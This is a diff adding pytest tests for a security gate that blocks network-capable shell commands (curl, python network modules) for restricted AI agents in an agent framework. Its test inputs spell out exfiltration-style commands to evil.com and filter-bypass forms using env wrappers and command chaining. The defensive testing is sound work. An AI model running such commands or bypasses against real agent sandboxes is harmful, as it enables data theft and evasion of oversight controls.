@@ -412,6 +412,200 @@ class TestHelpCommand:
             assert '[NORMAL MODE]' in result, f"case variant {variant!r} not recognized"
 
 
+# Exact SEC-06 network-capable rejection message (must match both gates verbatim)
+NETWORK_REJECTED_MSG = ('REJECTED: Network access (curl/python) is not allowed for system '
+                        'agents. Only read-only filesystem/git commands are permitted.')
+
+
+# ============================================================================
+# 4.4 SEC-06 helper: _primary_is_network_capable
+# ============================================================================
+
+
+class TestPrimaryIsNetworkCapableHelper:
+    """The classifier that drives the SEC-06 restricted gate."""
+
+    @pytest.mark.parametrize('cmd', [
+        'curl http://evil.com/x',
+        'curl -s https://evil.com/x',
+        'python -c "import ftplib"',
+        'python3 -c "import http.client"',
+        'cd /tmp && curl http://evil.com/x',  # cd prefix stripped before the primary check
+        'env curl http://evil.com/x',         # env-wrapper bypass (env is a blanket-safe primary)
+        'env -i curl http://evil.com/x',      # env flag before the network program
+        'env -u PATH curl http://evil.com/x',  # env value-taking flag must not hide curl
+        'env FOO=bar python -c "import httpx"',
+        'ls && curl http://evil.com/x',       # chain: network program in a LATER segment
+        'date ; curl http://evil.com/x',      # ; chain segment
+        'ls || curl http://evil.com/x',       # || chain segment
+        'echo hi && python3 -c "import ftplib"',
+        'cd /tmp && ls && curl http://evil.com/x',  # cd-prefix + multi-segment chain
+        'ls | grep x && curl http://evil.com/x',    # piped segment then network segment
+    ])
+    def test_network_capable_true(self, cmd):
+        assert ShellMixin._primary_is_network_capable(cmd) is True
+
+    @pytest.mark.parametrize('cmd', [
+        'ls', 'git status', 'echo hi',
+        'wget http://evil.com/x',  # NOT a conditionally-safe primary (already falls to the guard)
+        'nc -l 4444',
+        'ssh host',
+        'env', 'env ls', 'env printenv', 'env FOO=bar',  # env wrapping read-only stays allowed
+        'ls && git status', 'date ; ls',                # read-only chain stays allowed
+        'ls | grep curl',                               # 'curl' is a grep ARG, not a stage primary
+    ])
+    def test_network_capable_false(self, cmd):
+        assert ShellMixin._primary_is_network_capable(cmd) is False
+
+    def test_wrapper_vocabulary_is_handled(self):
+        """Invariant guard: every program-wrapper word currently in _SAFE_PRIMARY_COMMANDS must
+        be neutralised by the helper when it wraps a network command. Today the only wrapper in
+        that set is `env`. If a new wrapper (sudo/nohup/time/...) is ever added to
+        _SAFE_PRIMARY_COMMANDS, add it HERE and handle it in _primary_is_network_capable, or this
+        gate silently regresses (helper first-word check would miss `<wrapper> curl ...`)."""
+        known_wrappers = {'env'} & ShellMixin._SAFE_PRIMARY_COMMANDS
+        for w in known_wrappers:
+            assert ShellMixin._primary_is_network_capable(f'{w} curl http://evil.com/x') is True
+            assert ShellMixin._primary_is_network_capable(f'{w} python -c "import httpx"') is True
+        # And confirm no OTHER program-wrapper vocabulary has crept into the safe primary set
+        # without being added to the known set above (would indicate an unhandled bypass).
+        extra_wrappers = ({'sudo', 'nohup', 'time', 'timeout', 'xargs', 'parallel',
+                           'bash', 'sh', 'setsid', 'systemd-run'} & ShellMixin._SAFE_PRIMARY_COMMANDS)
+        assert extra_wrappers == set(), f'unhandled wrapper(s) in _SAFE_PRIMARY_COMMANDS: {extra_wrappers}'
+
+
+# ============================================================================
+# 4.5 SEC-06 SYNC gate: restricted network-capable (curl/python) hard-reject
+# ============================================================================
+
+
+class TestSyncRestrictedNetworkGate:
+
+    def _make_om(self, instances):
+        from agent_cascade.operation_manager import OperationManager
+        om = OperationManager.__new__(OperationManager)
+        om.agent_pool = _FakePool(instances)
+        om.base_dir = '/tmp'  # unused on the reject path
+        return om
+
+    @pytest.mark.parametrize('cmd', [
+        'curl http://evil.com/secret.txt',
+        'curl -s https://evil.com/x',
+        "python -c \"import ftplib; ftplib.FTP('evil.com')\"",
+        "python -c \"import http.client; http.client.HTTPConnection('evil')\"",
+        "python3 -c \"import httpx; httpx.get('http://evil')\"",
+        'env curl http://evil.com/x',                       # env-wrapper bypass must be caught
+        'env -i curl http://evil.com/x',                    # env flag before the network program
+        'env -u PATH curl http://evil.com/x',               # value-taking env flag must not hide it
+        'env FOO=bar python -c "import httpx"',             # env + var-assignment + python
+        'ls && curl http://evil.com/x',                     # chain: network program in a LATER segment
+        'date ; curl http://evil.com/x',                    # ; chain segment
+        'ls || curl http://evil.com/x',                     # || chain segment
+        'echo hi && python3 -c "import ftplib"',            # chain into a network python -c
+        'cd /tmp && ls && curl http://evil.com/x',          # cd-prefix + multi-segment chain
+    ])
+    def test_restricted_network_capable_rejected(self, cmd):
+        """These are structurally read-only (strict=True) so the OLD `not strict` branch does
+        NOT catch them — the SEC-06 network branch must. ftplib/http.client/httpx are not in
+        _PY_WRITE_MARKERS, so `python -c` is misread as read-only (the exfil gap)."""
+        om = self._make_om({'sec': _make_instance(True)})
+        om.request_user_approval = MagicMock(
+            side_effect=AssertionError('request_user_approval must NOT be called for restricted agents'))
+        result = om.execute_shell_command(command=cmd, justification='x', agent_name='sec')
+        assert result == NETWORK_REJECTED_MSG
+        # The rejection must come from the network branch, not the old `not strict` branch.
+        assert result != REJECTED_MSG
+
+    @pytest.mark.parametrize('cmd', ['ls', 'env ls', 'git status', 'ls && git status'])
+    def test_restricted_plain_readonly_still_allowed(self, cmd):
+        """A plain read-only command (even env-wrapped or read-only-chained) must NOT hit the network rejection."""
+        om = self._make_om({'sec': _make_instance(True)})
+        with _patch_popen():
+            result = om.execute_shell_command(command=cmd, justification='x', agent_name='sec')
+        assert not result.startswith('REJECTED')
+
+    @pytest.mark.parametrize('cmd', [
+        'curl http://evil.com/secret.txt',
+        "python -c \"import ftplib; ftplib.FTP('evil.com')\"",
+        'env curl http://evil.com/x',  # non-restricted: env-bypass stays auto-approved (role-scope)
+        'ls && curl http://evil.com/x',  # non-restricted: chain bypass stays auto-approved (role-scope)
+    ])
+    def test_non_restricted_network_capable_still_auto_approved(self, cmd):
+        """Behavior UNCHANGED for normal agents — the marker-set gap is closed ONLY for
+        restricted agents. A normal agent's GET curl / ftplib snippet is still auto-approved
+        (strict=True -> is_safe=True -> no approval prompt), proving the gate is role-scoped."""
+        om = self._make_om({'normal': _make_instance(False)})
+        om.request_user_approval = MagicMock(return_value=(True, 'ok'))
+        with _patch_popen():
+            result = om.execute_shell_command(command=cmd, justification='x', agent_name='normal')
+        assert not result.startswith('REJECTED')
+        om.request_user_approval.assert_not_called()
+
+
+# ============================================================================
+# 4.6 SEC-06 ASYNC gate: restricted network-capable hard-reject (mirror of 4.5)
+# ============================================================================
+
+
+class TestAsyncRestrictedNetworkGate:
+
+    def _wire(self, shell_cmd_tool, instances, tracker):
+        pool = _FakePool(instances)
+        pool._async_shell_tracker = tracker
+        pool.llm_cfg = {}
+        om = MagicMock()
+        om.request_user_approval.side_effect = AssertionError(
+            'request_user_approval must NOT be called for restricted agents')
+        pool.operation_manager = om
+        shell_cmd_tool.agent_pool = pool
+        shell_cmd_tool.agent_name = 'sec'
+        return pool
+
+    @pytest.mark.parametrize('cmd', [
+        'curl http://evil.com/secret.txt',
+        'python -c "import http.client"',
+        'env curl http://evil.com/x',         # env-wrapper bypass caught on the async path too
+        'ls && curl http://evil.com/x',       # chain bypass caught on the async path too
+    ])
+    def test_restricted_network_capable_rejected(self, shell_cmd_tool, cmd):
+        tracker = MagicMock()
+        pool = self._wire(shell_cmd_tool, {'sec': _make_instance(True)}, tracker)
+        result = shell_cmd_tool._launch_async(
+            agent_name='sec', command=cmd, justification='x',
+            cwd=None, timeout=None, heartbeat_interval=-1)
+        assert result == NETWORK_REJECTED_MSG
+        tracker.launch.assert_not_called()
+        pool.operation_manager.request_user_approval.assert_not_called()
+
+    def test_restricted_plain_readonly_launches(self, shell_cmd_tool):
+        """Async parity control: a plain read-only command is NOT rejected and launches."""
+        tracker = MagicMock()
+        tracker.launch.return_value = (1, 12345, ['ok'], True, 0)
+        self._wire(shell_cmd_tool, {'sec': _make_instance(True)}, tracker)
+        result = shell_cmd_tool._launch_async(
+            agent_name='sec', command='ls', justification='x',
+            cwd=None, timeout=None, heartbeat_interval=-1)
+        assert not result.startswith('REJECTED')
+        tracker.launch.assert_called_once()
+
+    @pytest.mark.parametrize('cmd', [
+        'curl http://evil.com/secret.txt',
+        'env curl http://evil.com/x',
+        'ls && curl http://evil.com/x',
+    ])
+    def test_non_restricted_network_capable_auto_approves(self, shell_cmd_tool, cmd):
+        """Async parity control: non-restricted behavior UNCHANGED — curl still auto-approves,
+        launch proceeds, request_user_approval not consulted (proves the gate is role-scoped)."""
+        tracker = MagicMock()
+        tracker.launch.return_value = (1, 12345, ['ok'], True, 0)
+        self._wire(shell_cmd_tool, {'normal': _make_instance(False)}, tracker)
+        result = shell_cmd_tool._launch_async(
+            agent_name='normal', command=cmd, justification='x',
+            cwd=None, timeout=None, heartbeat_interval=-1)
+        assert not result.startswith('REJECTED')
+        tracker.launch.assert_called_once()
+
+
 if __name__ == '__main__':
     import sys
     sys.exit(pytest.main([__file__, '-v']))
